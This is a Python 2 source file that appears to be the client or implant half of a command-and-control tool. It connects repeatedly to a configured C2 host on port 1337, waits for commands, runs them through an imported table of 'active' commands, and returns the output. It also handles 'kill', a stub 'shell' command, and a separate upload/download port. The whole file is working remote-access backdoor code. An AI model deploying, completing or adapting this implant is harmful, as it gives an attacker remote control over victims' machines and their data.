#!/usr/bin/env python
# coding: utf-8
import socket
import time

from extras import common
from commands import active

# change these to suit your needs
c2host = 'localhost'
c2port = 1337
duport = 1338 # for download/upload

#################################
##        Main Function        ##
#################################
def main():
    
    #Connection Loop
    connected = False
    while True:
        try:
            print "trying to connect...",
            conn = socket.socket()
            conn.connect((c2host, c2port))
            conn.settimeout(None)
            connected = True
            print "Connected!"
        except socket.error:
            print "Failed. retrying in 2 sec."
            time.sleep(2)
            continue

        while connected:
            results = ''

            # wait to receive data from server
            # SHORTFALL: maximum command size is 4096
            # REMEDY: Increase if needed. 4096 should be enough.
            try:
                data = conn.recv(4096)
            
                #socket was closed
                if not data:
                    raise socket.error

            except socket.error:
                print "connection lost"
                conn.close()
                connected  = False
                break

            # seperate data into command and action
            # all commands are lowercase.
            data = data.rstrip()
            cmd, _, action = data.partition(' ')
            cmd = cmd.lower()

            #try:
            if cmd in active:
                print "action - {} {}".format(cmd, action)
                com = active[cmd]
                results = com(action)
                if results:
                    conn.send(results)

            # Special cases
            elif cmd == "kill":
                print "KILLED"
                conn.close()
                exit(127)

            elif cmd=="shell":
                pass
                
            else:
                print "invalid - [ {}(\"{}\") ]".format(cmd, action)
        
            #except Exception as e:
            #  consider adding a blanket except
            # to close sockets gracefully before traceback
            #   conn.close()
            #   raise

if __name__ == '__main__':
    main()
